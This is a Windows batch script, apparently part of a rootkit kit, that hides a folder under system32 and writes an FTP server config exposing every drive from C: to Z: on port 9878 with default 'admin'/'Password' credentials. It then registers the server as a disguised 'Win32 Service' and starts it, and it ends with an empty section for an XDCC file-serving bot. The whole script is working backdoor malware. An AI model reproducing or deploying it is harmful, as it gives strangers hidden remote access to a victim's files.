echo off
cls
echo -----------------------------------------------------------------
echo This file created with trial version of Quick Batch File Compiler.
echo Copyright 2002-2005 by Abyssmedia.com
echo Offical web-site: http://www.abyssmedia.com
echo -----------------------------------------------------------------
pause
@ECHO OFF
ATTRIB +s +h %windir%\system32\MSDos
@ECHO ###############################
@ECHO #####   SETTING UP FTPD   #####
@ECHO ###############################
ECHO>Win32.CFG BindInterface All
ECHO>>Win32.CFG BindPort 9878
ECHO>>Win32.CFG CommandTimeout 300
ECHO>>Win32.CFG ConnectTimeout 15
ECHO>>Win32.CFG MaxConnections 20
ECHO>>Win32.CFG LookupHosts Off
ECHO>>Win32.CFG User "admin"
ECHO>>Win32.CFG Password "Password"
ECHO>>Win32.CFG Mount /RooT-KiT/ %windir%\system32\MSDos\
if exist c:\ ECHO>>Win32.CFG Mount /C-DRIVE/ C:\
if exist d:\ ECHO>>Win32.CFG Mount /D-DRIVE/ D:\
if exist e:\ ECHO>>Win32.CFG Mount /E-DRIVE/ E:\
if exist f:\ ECHO>>Win32.CFG Mount /F-DRIVE/ F:\
if exist g:\ ECHO>>Win32.CFG Mount /G-DRIVE/ G:\
if exist h:\ ECHO>>Win32.CFG Mount /H-DRIVE/ H:\
if exist i:\ ECHO>>Win32.CFG Mount /I-DRIVE/ I:\
if exist j:\ ECHO>>Win32.CFG Mount /J-DRIVE/ J:\
if exist k:\ ECHO>>Win32.CFG Mount /K-DRIVE/ K:\
if exist l:\ ECHO>>Win32.CFG Mount /L-DRIVE/ L:\
if exist m:\ ECHO>>Win32.CFG Mount /M-DRIVE/ M:\
if exist n:\ ECHO>>Win32.CFG Mount /N-DRIVE/ N:\
if exist o:\ ECHO>>Win32.CFG Mount /O-DRIVE/ O:\
if exist p:\ ECHO>>Win32.CFG Mount /P-DRIVE/ P:\
if exist q:\ ECHO>>Win32.CFG Mount /Q-DRIVE/ Q:\
if exist r:\ ECHO>>Win32.CFG Mount /R-DRIVE/ R:\
if exist s:\ ECHO>>Win32.CFG Mount /S-DRIVE/ S:\
if exist t:\ ECHO>>Win32.CFG Mount /T-DRIVE/ T:\
if exist u:\ ECHO>>Win32.CFG Mount /U-DRIVE/ U:\
if exist v:\ ECHO>>Win32.CFG Mount /V-DRIVE/ V:\
if exist w:\ ECHO>>Win32.CFG Mount /W-DRIVE/ W:\
if exist x:\ ECHO>>Win32.CFG Mount /X-DRIVE/ X:\
if exist y:\ ECHO>>Win32.CFG Mount /Y-DRIVE/ Y:\
if exist z:\ ECHO>>Win32.CFG Mount /Z-DRIVE/ Z:\
ECHO>>Win32.CFG Allow / All
ECHO /User>>Win32.CFG
MOVE Win32.cfg %windir%\system32\MSDos\FTPD
StartUp.exe -install -name:"Win32 Service" -launch:"%windir%\system32\MSDos\FTPD\Win32.exe"
net start "Win32 Service"
@ECHO ###############################
@ECHO #####   STARTED UP FTPD   #####
@ECHO ###############################
CLS
@ECHO ###############################
@ECHO #####   SETTING UP XDCC   #####
@ECHO ###############################





PAUSE
